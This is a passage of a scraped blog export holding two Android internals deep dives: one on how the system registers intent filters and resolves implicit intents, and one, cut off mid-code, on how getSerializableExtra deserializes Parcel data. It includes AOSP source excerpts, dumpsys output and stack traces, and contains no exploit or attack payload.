https://developer.android.com/guide/navigation/design/deep-link","lastmodified":"2025-04-14T14:14:33.954126369Z","tags":null},"/notes/Android-Deep-Dive-Implicit-Intents":{"title":"Android Deep Dive - Implicit Intents","content":"\n## Introduction\nFrom the official [Android documentation](https://developer.android.com/reference/android/content/Intent), theÂ `Intent`Â is described as â€œan abstract description of an operation to be performedâ€. Conceptually, it can be simplified as an â€œintention to do something with another applicationâ€ across Inter-Process Communication (IPC). One of the most interesting facility that intents offer is the implicit resolution. An application can explicitly declare to handle specific intents (through theÂ `\u003cintent-filter\u003e`Â declaration) and these intents areÂ ***magically***Â delivered to it from other applications, without the knowledge of the final destination package. Since magic can be hypothetically just defined as a form of ignorance (*at least*Â in computer science?), letâ€™s see where the â€œmagicâ€ happens in the Android source code!\n\n## Intent registration\n### Starting from the beginning\nLet's start from an application point of view that needs to handle specific actions: an `\u003cintent-filter\u003e` is declared inside the `AndroidManifest.xml`:\n```xml\n\u003ccomponent android:name\u003e\n\t\u003cintent-filter\u003e\n\t\t\u003caction android:name=\"android.intent.action.VIEW\"\u003e\n\t\t\u003ccategory android:name=\"android.intent.category.DEFAULT\"/\u003e\n\t\t\u003cdata android:scheme=\"scheme\"/\u003e\n\t\u003c/intent-filter\u003e\n\u003c/component\u003e\n```\nIn this example, the `component` can be of any type: an `activity`, `receiver`, `service` or `provider`. Some filters are also specified in order to discriminate matching events that the component is interested into: `action`, `category` and `data` (with the `android:scheme` attribute) are specifically used in this case (check out the [\\\u003cintent-filter\\\u003e documentation](https://developer.android.com/guide/topics/manifest/intent-filter-element) for more filters and options).\nAt install time, the [`PackageInstaller`](https://developer.android.com/reference/android/content/pm/PackageInstaller) service is responsible to install the application and all its components, including intent filters. More specifically, diving into the AOSP (Android Open Source Project) codebase, it is possible to identify some key functions that parse all declared components. More specifically, the [`ComponentResolver::addAllComponents`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/pm/resolution/ComponentResolver.java;drc=4bf59a583eefeb8b27a79fbd1fc5093ddb79d747;l=191) method calls four methods that parse all components' details.\n\n```java \n    public void addAllComponents(/*..*/){\n        /*..*/\n        synchronized (mLock) {\n            addActivitiesLocked(computer, pkg, newIntents, chatty);\n            addReceiversLocked(computer, pkg, chatty);\n            addProvidersLocked(computer, pkg, chatty);\n            addServicesLocked(computer, pkg, chatty);\n            onChanged();\n        }\n        /*..*/\n```\n\nFollowing the `Add[Component]Locked` logic, components are registered based on their type on specific variables (e.g. `mActivities`, `mProviders`, `mReceivers` and `mServices`) and then intent filters are parsed. Let's take the activity parsing as an example to reference some code, but the concept is the same across all different components. `addActivitiesLocked` calls [`mActivities.addActivity`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/pm/resolution/ComponentResolver.java;l=282) (part of the `ComponentResolver` class) that calls `addFilter` for each declared intent filter.\n\n```java\n\t// code cutted for demonstration purposes\n\tprotected void addActivity(@NonNull Computer computer, ParsedActivity a, String type,\n\t\t\tList\u003cPair\u003cParsedActivity, ParsedIntentInfo\u003e\u003e newIntents) {\n\t\tfinal int intentsSize = a.getIntents().size();\n\t\tfor (int j = 0; j \u003c intentsSize; j++) {\n\t\t\tParsedIntentInfo intent = a.getIntents().get(j);\n\t\t\tIntentFilter intentFilter = intent.getIntentFilter();\n\t\t\tif (newIntents != null \u0026\u0026 \"activity\".equals(type)) {\n\t\t\t\tnewIntents.add(Pair.create(a, intent));\n\t\t\t}\n\t\t\t/* .. */\n\t\t\taddFilter(computer, Pair.create(a, intent));\n\t\t}\n\t}\n```\n\nIntents are cycled within a for loop and each declared intent filter is passed as an argument to [`ComponentResolver::MimeGroupsAwareIntentResolver::addFilter`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/pm/resolution/ComponentResolver.java;l=834) that finally calls [`IntentResolver::addFilter`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/IntentResolver.java;l=58) where most of the registering process happens. Before diving into the logic of this specific method, it is important to discriminate intent filters as they are internally classified: `Full MIME Types`, `Base MIME Types`, `Wild MIME Types`, `Schemes`, `Non-data Actions`, `MIME Typed Actions`.\n### The \"obscure\", less-known, internal classification\nThe \"obscure\" adjective is a clearly amplification of the concept, but there is an interesting internal intent classification (that influences the consecutive resolution process) that is not explicitly documented in the Android Documentation (that is, for most parts, really complete) and it was possible to identify it by wandering in the codebase, more specifically into the [`IntentResolver::dump`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/IntentResolver.java;l=286) method reachable from the `dumpsys` utility (more on that later). These categories are not really difficult to understand and they are particularly influenced by the specified MIME type that can be explicitly defined in the `\u003cintent-filter\u003e` declaration using the [`mimeType`](https://developer.android.com/guide/topics/manifest/data-element#mime) attribute inside the [`\u003cdata\u003e`](https://developer.android.com/guide/topics/manifest/data-element) tag . The MIME type standard is widely used across technologies in order to identify resource types (e.g. `image/png`, `text/html`, ..) and consists of two main parts that we are interested into:\n- **Type**: the generic type of the the format, for example `image`, `application`, `audio`, `video` and so on.\n- **Subtype**: the subtype is more specific and contains the media format. For example `png`, `html` and `mp4` are an example of possible subtypes. \n\nWith this knowledge, we can go through all categories:\n- `Full MIME Types`: inside this category we have all possible MIME Types independently of its two parts (e.g. `image/png` and `image/*`).\n- `Base MIME Types`: the base classification is related to data types that fully contains the two parts (e.g. `image/png` or `video/mp4`).\n- `Wild MIME Types`: MIME Types without the \"subtype\" (e.g. `image` or `video`) or with a mask (e.g. `image/*` or `video/*`).\n- `Schemes`: intent filters that handles data schemes (e.g. `\u003cdata android:scheme=\"scheme\"/\u003e`).\n- `Non-data Actions`: Intent filters that do not contain any MIME type and data scheme.\n- `MIME Typed Actions`: Intent filters that contains at least one MIME type.\n\nAs can be seen, an intent filter can also fall inside different categories. For example, an intent filter declared with a `mimeType` of value `image` is classified inside the `Full MIME Type` (as it contains a MIME type), `Wild Mime Type`  (as it contains only the first part of the MIME type) and `MIME Typed Action` since it contains at least one MIME type.\n\n### Registering methods\nAfter this needed digression on the internal classification, let's jump back to the [`IntentResolver::addFilter`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/IntentResolver.java;l=58):\n\n```java\n// simplified code\npublic void addFilter(@Nullable PackageDataSnapshot snapshot, F f) {\n\t/* .. */*\n\tmFilters.add(f);\n\tint numS = register_intent_filter(f, intentFilter.schemesIterator(),\n\t\t\tmSchemeToFilter, \"      Scheme: \");\n\tint numT = register_mime_types(f, \"      Type: \");\n\tif (numS == 0 \u0026\u0026 numT == 0) {\n\t\tregister_intent_filter(f, intentFilter.actionsIterator(),\n\t\t\t\tmActionToFilter, \"      Action: \");\n\t}\n\tif (numT != 0) {\n\t\tregister_intent_filter(f, intentFilter.actionsIterator(),\n\t\t\t\tmTypedActionToFilter, \"      TypedAction: \");\n\t}\n}\n\nprivate final int register_mime_types(F filter, String prefix) {\n\tfinal Iterator\u003cString\u003e i = getIntentFilter(filter).typesIterator();\n\t/* .. */\n\tint num = 0;\n\twhile (i.hasNext()) {\n\t\tString name = i.next();\n\t\tnum++;\n\t\tString baseName = name;\n\t\tfinal int slashpos = name.indexOf('/');\n\t\tif (slashpos \u003e 0) {\n\t\t\tbaseName = name.substring(0, slashpos).intern();\n\t\t} else {\n\t\t\tname = name + \"/*\";\n\t\t}\n\n\t\taddFilter(mTypeToFilter, name, filter);\n\n\t\tif (slashpos \u003e 0) {\n\t\t\taddFilter(mBaseTypeToFilter, baseName, filter);\n\t\t} else {\n\t\t\taddFilter(mWildTypeToFilter, baseName, filter);\n\t\t}\n\t}\n\treturn num;\n}\n```\n\nThis method is responsible to register three main categories through its code using the [`IntentResolver::register_intent_filter`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/IntentResolver.java;l=640) method: `Schemes`, `Non-Data actions` and `Typed`, while other MIME-related categories are registered through [`IntentResolver::register_mime_types`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/IntentResolver.java;l=579). As can be observed from the code, filters are registered following the previously described classification and results are stored inside the following class members (defined inside [`IntentResolver.java`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/IntentResolver.java;l=871)): `mSchemeToFilter`, `mActionToFilter`, `mTypedActionToFilter`, `mTypedActionToFilter`, `mBaseTypeToFilter` and `mWildTypeToFilter`. These members are later used for the resolution process.\n## Intent resolution\nWe have seen the logic behind the registration process of intent filters and now we are in the hearth of the topic: the resolution process.\nThe resolution process, and related system services and APIs, particularly depends on the targeted components (activities, receivers, services or providers) but in order to circumscribe the logic, let's take into account two common APIs: `startActivity` and `sendBroadcast`. They can both send intents and, more importantly, **implicit** intents. \n### startActivity\nLet's start our journey with the `startActivity` API, using a simple code as a reference:\n```java\nIntent in = new Intent(\"com.example.non_existent.ACTION\", Uri.parse(\"13371337\"););\nstartActivity(in);\n```\n\nFrom the imported library code (e.g. inside the sender application process) after some preliminary error checking, the `startActivity` method from the `ActivityTaskManager` system service is called. This service method is responsible to find and start the destination activity if matched and it is part of the `system_server` services. In order to find target destinations that match a specific intent action (if not explicitly set from the sender), the previously described attributes (`mSchemeToFilter`, `mActionToFilter`, ..) are consulted from an internal method: [`IntentResolver::queryIntent`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/IntentResolver.java;l=382). \n#### IntentResolver::queryIntent\nThis method is reached after multiple calls (see the [[#Backtrace startActivity]] backtrace for all involved methods) and is responsible to loop over mentioned attributes in order to find most suitable destinations. The returned result is a list of candidates (`List\u003cR\u003e`).\nThe objective is not as easy to implement: a requested intent can have multiple candidates of any type (matching the MIME type, scheme and data) but need to return results that include everything!\n```java\nprotected final List\u003cR\u003e queryIntent(@NonNull PackageDataSnapshot snapshot, Intent intent,\n\t\tString resolvedType, boolean defaultOnly, @UserIdInt int userId, long customFlags) {\n\tString scheme = intent.getScheme();\n\tArrayList\u003cR\u003e finalList = new ArrayList\u003cR\u003e();\n\t/* .. */\n\n\tF[] firstTypeCut = null;\n\tF[] secondTypeCut = null;\n\tF[] thirdTypeCut = null;\n\tF[] schemeCut = null;\n\n\t// If the intent includes a MIME type, then we want to collect all of\n\t// the filters that match that MIME type.\n\tif (resolvedType != null) { // [1]\n\t\tint slashpos = resolvedType.indexOf('/');\n\t\tif (slashpos \u003e 0) {\n\t\t\tfinal String baseType = resolvedType.substring(0, slashpos);\n\t\t\tif (!baseType.equals(\"*\")) {\n\t\t\t\tif (resolvedType.length() != slashpos+2\n\t\t\t\t\t\t|| resolvedType.charAt(slashpos+1) != '*') {\n\t\t\t\t\tfirstTypeCut = mTypeToFilter.get(resolvedType); // [2]\n\t\t\t\t\tsecondTypeCut = mWildTypeToFilter.get(baseType); // [4]\n\t\t\t\t} else {\n\t\t\t\t\t// We can match anything with our base type.\n\t\t\t\t\tfirstTypeCut = mBaseTypeToFilter.get(baseType); // [3]\n\t\t\t\t\tsecondTypeCut = mWildTypeToFilter.get(baseType); // [4]\n\t\t\t\t}\n\t\t\t\tthirdTypeCut = mWildTypeToFilter.get(\"*\");\n\t\t\t} else if (intent.getAction() != null) {\n\t\t\t\t// The intent specified any type ({@literal *}/*).  This\n\t\t\t\t// can be a whole heck of a lot of things, so as a first\n\t\t\t\t// cut let's use the action instead.\n\t\t\t\tfirstTypeCut = mTypedActionToFilter.get(intent.getAction()); // [5]\n\t\t\t}\n\t\t}\n\t}\n\n\tif (scheme != null) {\n\t\tschemeCut = mSchemeToFilter.get(scheme); // [6]\n\t}\n\n\tif (resolvedType == null \u0026\u0026 scheme == null \u0026\u0026 intent.getAction() != null) {\n\t\tfirstTypeCut = mActionToFilter.get(intent.getAction()); // [7]\n\t}\n\n\tFastImmutableArraySet\u003cString\u003e categories = getFastIntentCategories(intent);\n\tComputer computer = (Computer) snapshot;\n\tif (firstTypeCut != null) {\n\t\tbuildResolveList(computer, intent, categories, debug, defaultOnly, resolvedType,\n\t\t\t\tscheme, firstTypeCut, finalList, userId, customFlags);\n\t}\n\tif (secondTypeCut != null) {\n\t\tbuildResolveList(computer, intent, categories, debug, defaultOnly, resolvedType,\n\t\t\t\tscheme, secondTypeCut, finalList, userId, customFlags);\n\t}\n\tif (thirdTypeCut != null) {\n\t\tbuildResolveList(computer, intent, categories, debug, defaultOnly, resolvedType,\n\t\t\t\tscheme, thirdTypeCut, finalList, userId, customFlags);\n\t}\n\tif (schemeCut != null) {\n\t\tbuildResolveList(computer, intent, categories, debug, defaultOnly, resolvedType,\n\t\t\t\tscheme, schemeCut, finalList, userId, customFlags);\n\t}\n\tfilterResults(finalList);\n\tsortResults(finalList);\n\n\t/* .. */\n\treturn finalList;\n}\n```\n\nThe `queryIntent` function satisfy this logic by using multiple \"cuts\". It starts from the first cut that is related to MIME types[1]: if the intent matches some MIME type, the matching candidates are extracted from `Full MIME Types` [2], `Base MIME Types` [3] and `Wild Mime Types` [4] relative members. An interesting behavior is for the `Typed Action` filters[5]: If the primary part of the MIME type is `*` (e.g. `*/*`) then, since the target can be anything and is too much generic, the action is used as a discrimination.\nThen, if the `scheme` is specified, `schemes` candidate filters are retrieved [6] and the same (if the `scheme` is null) for the `Non-data actions`[7]. Every cut candidates are then confirmed from the `buildResolveList` to match all requested intent characteristics with the [`intentFilter.match(..)`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/IntentResolver.java;l=773) call\nand the final list is returned in the `finalList` variable.\n\n### sendBroadcast\nThe `senBroadcast` resolution logic is really similar to the `startActivity` function with a major difference: the requested method and service.\n```java\nIntent in = new Intent(\"com.example.non_existent.ACTION\", Uri.parse(\"13371337\"););\nsendBroadcast(in);\n```\n\nThe involved service is the `ActivityManager` with the `broadcastIntentWithFeature` service method. As can be seen from the stack trace at the bottom ([[#Backtrace sendBroadcast]]) the `IntentResolver::queryIntent` method is called from the `ComponentResolver` class and the logic is the same one describer earlier.\n### System Services and other methods\nWe have treated two common methods but there are multiple entry points to resolve intents for different types of components, however the logic is always the same: registered intents are cycled through the `IntentResolver::queryIntent` method. For example, the `queryIntentActivities` method is another commonly used method, exposed from the `PackageManager` system service, to resolve intents. AIDLs (Android Interface Definition Language) for the described services can be consulted there for more exposed functionalities: [`IActivityTaskManager.aidl`](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/app/IActivityTaskManager.aidl;l=95;bpv=0;bpt=0?q=IActivityTaskManager\u0026ss=android/platform/superproject/main), [`IActivityManager.aidl`](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/app/IActivityManager.aidl;l=1;bpv=0;bpt=0?q=android.app.IActivityManager\u0026sq=\u0026ss=android/platform/superproject/main) and [`PackageManager.aidl`](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/content/pm/IPackageManager.aidl;l=1;bpv=0;bpt=0?q=IPackageManager.aidl%20\u0026ss=android/platform/superproject/main)\n## dumpsys\nThe `dumpsys` utility is extremely helpful to list all registered intent filters in the system through the `package` argument. It offers the internal classification structure as output and the dump logic can be found from the previously mentioned [`IntentResolver::dump`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/services/core/java/com/android/server/IntentResolver.java;l=286) method. The output contains the \"Resolver Table\" for each component type (activity, receiver, service and provider) with the described internal classification (`Full MIME Types`, `Non-data actions`, ..). For example, the `adb shell dumpsys package` returns a similar output:\n```bash\n$ adb shell dumpsys package\n# ...\nActivity Resolver Table:\n  Full MIME Types:\n      application/pkix-cert:\n        9f5fd74 com.android.certinstaller/.CertInstallerMain\n      x-mixmedia/*:\n        6f2b72d com.google.android.bluetooth/com.android.bluetooth.opp.BluetoothOppLauncherActivity\n      vnd.android.cursor.dir/raw_contact:\n        58bbd45 com.google.android.contacts/com.android.contacts.activities.PeopleActivity\n        ac07323 com.google.android.contacts/com.android.contacts.activities.CompactContactEditorActivity\n        d430587 com.google.android.contacts/com.google.android.apps.contacts.editorlite.ContactsEditorlite\n      application/vnd.google-apps.map:\n        169295e com.google.android.apps.docs/.app.OpenSafUrlActivity\n# ....\n```\n\nIt is possible to add the `-f` option to print details for all specific filters such as declared actions, categories and data. In order to limit the output to a specific app, the application name can be specified: `adb shell dumpsys package com.target.app`.\n```bash\n$ adb shell dumpsys package com.target.pp\n# ...\n  MIME Typed Actions:\n      android.intent.action.VIEW:\n        9f5fd74 com.android.certinstaller/.CertInstallerMain filter fa0d312\n          Action: \"android.intent.action.VIEW\"\n          Category: \"android.intent.category.DEFAULT\"\n          StaticType: \"application/x-x509-ca-cert\"\n          StaticType: \"application/x-x509-user-cert\"\n          StaticType: \"application/x-x509-server-cert\"\n          StaticType: \"application/x-pkcs12\"\n          StaticType: \"application/x-pem-file\"\n          StaticType: \"application/pkix-cert\"\n          StaticType: \"application/x-wifi-config\"\n# ...\n```\n\n## Backtraces\n### Backtrace: startActivity\n```java\nat com.android.server.IntentResolver.queryIntent(Native Method)\nat com.android.server.pm.resolution.ComponentResolver$ActivityIntentResolver.queryIntent(ComponentResolver.java:985)\nat com.android.server.pm.resolution.ComponentResolverBase.queryActivities(ComponentResolverBase.java:130)\nat com.android.server.pm.ComputerEngine.queryIntentActivitiesInternalBody(ComputerEngine.java:756)\nat com.android.server.pm.ComputerEngine.queryIntentActivitiesInternal(ComputerEngine.java:584)\nat com.android.server.pm.ResolveIntentHelper.resolveIntentInternal(ResolveIntentHelper.java:190)\nat com.android.server.pm.PackageManagerInternalBase.resolveIntentExported(PackageManagerInternalBase.java:476)\nat com.android.server.wm.ActivityTaskSupervisor.resolveIntent(ActivityTaskSupervisor.java:766)\nat com.android.server.wm.ActivityStarter$Request.resolveActivity(ActivityStarter.java:568)\nat com.android.server.wm.ActivityStarter.execute(ActivityStarter.java:707)\nat com.android.server.wm.ActivityTaskManagerService.startActivityAsUser(ActivityTaskManagerService.java:1288)\nat com.android.server.wm.ActivityTaskManagerService.startActivityAsUser(ActivityTaskManagerService.java:1239)\nat com.android.server.wm.ActivityTaskManagerService.startActivity(ActivityTaskManagerService.java:1214)\nat android.app.IActivityTaskManager$Stub.onTransact(IActivityTaskManager.java:929)\nat com.android.server.wm.ActivityTaskManagerService.onTransact(ActivityTaskManagerService.java:5511)\nat android.os.Binder.execTransactInternal(Binder.java:1339)\nat android.os.Binder.execTransact(Binder.java:1275)\n```\n### Backtrace: sendBroadcast\n```java\nat com.android.server.IntentResolver.queryIntent(Native Method)\nat com.android.server.pm.resolution.ComponentResolver$ActivityIntentResolver.queryIntent(ComponentResolver.java:985)\nat com.android.server.pm.resolution.ComponentResolverBase.queryActivities(ComponentResolverBase.java:130)\nat com.android.server.pm.ComputerEngine.queryIntentActivitiesInternalBody(ComputerEngine.java:756)\nat com.android.server.pm.ComputerEngine.queryIntentActivitiesInternal(ComputerEngine.java:584)\nat com.android.server.pm.ComputerEngine.queryIntentActivitiesInternal(ComputerEngine.java:628)\nat com.android.server.pm.IPackageManagerBase.queryIntentActivities(IPackageManagerBase.java:1000)\nat android.content.pm.IPackageManager$Stub.onTransact(IPackageManager.java:2275)\nat com.android.server.pm.PackageManagerService$IPackageManagerImpl.onTransact(PackageManagerService.java:6334)\nat android.os.Binder.execTransactInternal(Binder.java:1339)\nat android.os.Binder.execTransact(Binder.java:1275)\n```\n\n## Conclusion\nWe have covered the internal intent resolution process that deals with the `\u003cintent-filter\u003e` package declaration, going through involved system services and the internal AOSP codebase. In the next blog post we will cover Deep and App linking in more details due to its strict relation with the the intent declaration and its interesting attack surface.\n\n## References\n- https://cs.android.com/\n- https://developer.android.com/","lastmodified":"2025-04-14T14:14:33.954126369Z","tags":null},"/notes/Android-Deserialization-Deep-Dive":{"title":"Android Deserialization Deep Dive","content":"## Introduction\nSerialization and deserialization mechanisms are always risky operations from a security point of view. In most languages and frameworks, if an attacker is able to deserialize arbitrary input (or just corrupt it as we have demonstrated years ago with the Rusty Joomla RCE) the impact is usually the most critical: Remote Code Execution. Without re-explaining the wheel, since there are already multiple good resources online that explains the basic concepts of insecure deserialization issues, we would like to put our attention into an interesting android API and class: `getSerializableExtra` and `Serializable`.\n\n## `getSerializableExtra` introduction\nThe [`getSerializableExtra`](\u003chttps://developer.android.com/reference/android/content/Intent#getSerializableExtra(java.lang.String)\u003e) API, from the [`Intent`](\u003chttps://developer.android.com/reference/android/content/Intent#getSerializableExtra(java.lang.String,%20java.lang.Class%3CT%3E)\u003e) class, permits to retrieve a [`Serializable`](https://developer.android.com/reference/java/io/Serializable) object through an extra parameter of a receiving Intent and, if the component is exported and enabled, it can represents an interesting attack surface from an attacker point of view. The `getSerializableExtra(String name)` has been deprecated in Android API level 33 (Android 13) in favor of the type safer `getSerializableExtra(String name, Class\u003cT\u003e clazz)`. The [`Serializable`](https://developer.android.com/reference/java/io/Serializable) class documentation, that enables object deserialization, contains the following bold text:\n\u003e **Warning: Deserialization of untrusted data is inherently dangerous and should be avoided. Untrusted data should be carefully validated.**\n\nSince we already know the generic risks of deserializing an arbitrary input object, the objective of this deep dive is to understand the real consequences of calling `getSerializableExtra` on arbitrary input with and without the type safer parameter.\n\n## `getSerializableExtra` internal code overview\n### First steps\nWhat's better than actually begin by reading the source code of the API in our interest? We think nothing, so this is the summary of the `getSerializableExtra` flow using AOSP on Android 15: `Intent::getSerializableExtra` =\u003e `Bundle::getSerializable` =\u003e `BaseBundle::getSerializable` =\u003e `BaseBundle::getValue` =\u003e `..`.\n\n```java\n// Intent::getSerializableExtra\npublic @Nullable Serializable getSerializableExtra(String name) {\n    return mExtras == null ? null : mExtras.getSerializable(name);\n}\n\n// Bundle::getSerializable\npublic Serializable getSerializable(@Nullable String key) {\n    return super.getSerializable(key);\n}\n\n// BaseBundle::getSerializable\nSerializable getSerializable(@Nullable String key) {\n    unparcel();\n    Object o = getValue(key);\n    if (o == null) {\n        return null;\n    }\n    try {\n        return (Serializable) o;\n    } catch (ClassCastException e) {\n        typeWarning(key, o, \"Serializable\", e);\n        return null;\n    }\n}\n\n// BaseBundle::getValue\nfinal Object getValue(String key) {\n\treturn getValue(key, /* clazz */ null);\n}\n\n// BaseBundle::getValue\nfinal \u003cT\u003e T getValue(String key, @Nullable Class\u003cT\u003e clazz) {\n\t// Avoids allocating Class[0] array\n\treturn getValue(key, clazz, (Class\u003c?\u003e[]) null);\n}\n// BaseBundle::getValue\nfinal \u003cT\u003e T getValue(String key, @Nullable Class\u003cT\u003e clazz, @Nullable Class\u003c?\u003e... itemTypes) {\n\tint i = mMap.indexOfKey(key);\n\treturn (i \u003e= 0) ? getValueAt(i, clazz, itemTypes) : null;\n}\n\n// BaseBundle::getValueAt\nfinal \u003cT\u003e T getValueAt(int i, @Nullable Class\u003cT\u003e clazz, @Nullable Class\u003c?\u003e... itemTypes) {\n\tObject object = mMap.valueAt(i);\n\tif (object instanceof BiFunction\u003c?, ?, ?\u003e) {\n\t\tsynchronized (this) {\n\t\t\tobject = unwrapLazyValueFromMapLocked(i, clazz, itemTypes);\n\t\t}\n\t}\n\treturn (clazz != null) ? clazz.cast(object) : (T) object;\n}\n```\n\n`BaseBundle::getSerializable` is the one responsible to retrieve the value from the received Intent (or at this level is better to define it as a [`Parcel`](https://developer.android.com/reference/android/os/Parcel) object) and it returns the object casted to `Serializable`. This flow is really similar to the retrieval of other parameter types. If you see the `getString`, `getCharSequence` or `getDobule` methods they act in a similar way: they retrieve a generic `Object` from `mMap.getKey()` and then return its type through casting (e.g. `return (String) o)`). \n\nIn this case things are a little bit differents: `getValue` specifies the `null` class and, after some calls, `getValueAt` is called to retrieve the serialized object. `mMap.valueAt` returns the generic `Object` that is then returned with a generic `T` cast (if no class is specified) to the caller. In the middle of this there is a really weird if condition that checks if the retrieved `object` is an instance of `BiFunction\u003c?, ?, ?\u003e`. Honestly, I was not able to determine this condition manually with code review, so I tried it at runtime and is actually triggering the true path when `getSerializable` is called. The `unwrapLazyValueFromMapLocked` stack trace is really interesting: `android.os.BaseBundle.unwrapLazyValueFromMapLocked` =\u003e `android.os.Parcel$LazyValue.apply` =\u003e `android.os.Parcel.readValue` =\u003e `android.os.Parcel.readSerializableInternal` \n\n### `Parcel::readSerializableInternal`\nSince our main interest is on how input objects are handled and deserialized, we can directly focus on the latest method that seems to align with our objective:\n```java\nprivate \u003cT\u003e T readSerializableInternal(@Nullable final ClassLoader loader,\n\t\t@Nullable Class\u003cT\u003e clazz) {\n\tString name = readString();\n\tif (name == null) {\n\t\t// For some reason we were unable to read the name of the Serializable (either there\n\t\t// is nothing left in the Parcel to read, or the next value wasn't a String), so\n\t\t// return null, which indicates that the name wasn't found in the parcel.\n\t\treturn null;\n\t}\n\n\ttry {\n\t\tif (clazz != null \u0026\u0026 loader != null) {\n\t\t\t// If custom classloader is provided, resolve the type of serializable using the\n\t\t\t// name, then check the type before deserialization. As in this case we can resolve\n\t\t\t// the class the same way as ObjectInputStream, using the provided classloader.\n\t\t\tClass\u003c?\u003e cl = Class.forName(name, false, loader);\n\t\t\tif (!clazz.isAssignableFrom(cl)) {\n\t\t\t\tthrow new BadTypeParcelableException(\"Serializable object \"\n\t\t\t\t\t\t+ cl.getName() + \" is not a subclass of required class \"\n\t\t\t\t\t\t+ clazz.getName() + \" provided in the parameter\");\n\t\t\t}\n\t\t}\n\t\tbyte[] serializedData = createByteArray(); //1\n\t\tByteArrayInputStream bais = new ByteArrayInputStream(serializedData); //2\n\t\tObjectInputStream ois = new ObjectInputStream(bais) {\n\t\t\t@Override\n\t\t\tprotected Class\u003c?\u003e resolveClass(ObjectStreamClass osClass)\n\t\t\t\t\tthrows IOException, ClassNotFoundException {\n\t\t\t\t// try the custom classloader if provided\n\t\t\t\tif (loader != null) {\n\t\t\t\t\tClass\u003c?\u003e c = Class.forName(osClass.getName(), false, loader);\n\t\t\t\t\treturn Objects.requireNonNull(c);\n\t\t\t\t}\n\t\t\t\treturn super.resolveClass(osClass);\n\t\t\t}\n\t\t};\n\t\tT object = (T) ois.readObject();\n\t\tif (clazz != null \u0026\u0026 loader == null) {\n\t\t\t// If custom classloader is not provided, check the type of the serializable using\n\t\t\t// the deserialized object, as we cannot resolve the class the same way as\n\t\t\t// ObjectInputStream.\n\t\t\tif (!clazz.isAssignableFrom(object.getClass())) {\n\t\t\t\tthrow new BadTypeParcelableException(\"Serializable object \"\n\t\t\t\t\t\t+ object.getClass().getName() + \" is not a subclass of required class \"\n\t\t\t\t\t\t+ clazz.getName() + \" provided in the parameter\");\n\t\t\t}\n\t\t}\n\t\treturn object;\n\t} catch (IOException ioe) {\n\t\tthrow new BadParcelableException(\"Parcelable encountered \"\n\t\t\t\t+ \"IOException reading a Serializable object (name = \"\n\t\t\t\t+ name + \")\", ioe);\n\t} catch (ClassNotFoundException cnfe) {\n\t\tthrow new BadParcelableException(\"Parcelable encountered \"\n\t\t\t\t+ \"ClassNotFoundException reading a Serializable object (name = \"\n\t\t\t\t+ name + \")\", cnfe);\n\t}\n}\n```\n\n#### Method parameters: `loader` and `clazz`\nWe can start to get an idea of what is going on with an high level overview of the overall method. Two parameters are accepted: `loader` and `clazz`. The `clazz` is null if `getSerializible` have not specified any class (`null` is specified in the `BaseBundle::getValue` method mentioned before). The `loader` parameter instead is passed and defined something in between the stack trace from `unwrapLazyValueFromMapLocked` and `android.os.Parcel.readSerializableInternal`:\n```java\n/* \nruntime stack trace \n- android.os.BaseBundle.unwrapLazyValueFromMapLocked\n- android.os.Parcel$LazyValue.apply\n- android.os.Parcel.readValue\n- android.os.Parcel.readSerializableInternal\n*/\n\n// BaseBundle::unwrapLazyValueFromMapLocked\nprivate Object unwrapLazyValueFromMapLocked(int i, @Nullable Class\u003c?\u003e clazz,\n\t\t@Nullable Class\u003c?\u003e... itemTypes) {\n\t// ...\n\tobject = ((BiFunction\u003cClass\u003c?\u003e, Class\u003c?\u003e[], ?\u003e) object).apply(clazz, itemTypes);\n\t// ...\n}\n\n// Parcel::apply\n// https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/os/Parcel.java?q=symbol%3A%5Cbandroid.os.Parcel.LazyValue.apply%5Cb%20case%3Ayes\npublic Object apply(@Nullable Class\u003c?\u003e clazz, @Nullable Class\u003c?\u003e[] itemTypes) {\n\t/* .. */\n\tif (source != null) {\n\t\tsynchronized (source) {\n\t\t\tif (mSource != null) {\n\t\t\t\t/* .. */\n\t\t\t\tmObject = source.readValue(mLoader, clazz, itemTypes); // [1]\n\t\t\t\t/* .. */\n\t\t\t\t\tsource.setDataPosition(restore);\n\t\t\t\t}\n\t\t\t\t/* .. */\n\t\t\t}\n\t\t}\n\t}\n\treturn mObject;\n}\n\n// Parcel::readValue\n// https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/os/Parcel.java;drc=1cce66c0004230c737a7ef3bbc1559015d83eaa6;bpv=1;bpt=1;l=4577?gsn=readValue\u0026gs=KYTHE%3A%2F%2Fkythe%3A%2F%2Fandroid.googlesource.com%2Fplatform%2Fsuperproject%2Fmain%2F%2Fmain%3Flang%3Djava%3Fpath%3Dandroid.os.Parcel%23467d8723cbf68a577318de9ec06f6c3232392a47c55b91808cace508df664007\nprivate \u003cT\u003e T readValue(@Nullable ClassLoader loader, @Nullable Class\u003cT\u003e clazz,\n\t\t@Nullable Class\u003c?\u003e... itemTypes) {\n\tint type = readInt();\n\t/* .. */\n\tfinal T object;\n\tif (isLengthPrefixed(type)) {\n\t\t/* .. */\n\t\tobject = readValue(type, loader, clazz, itemTypes);\n\t\t/* .. */\n\t} else {\n\t\tobject = readValue(type, loader, 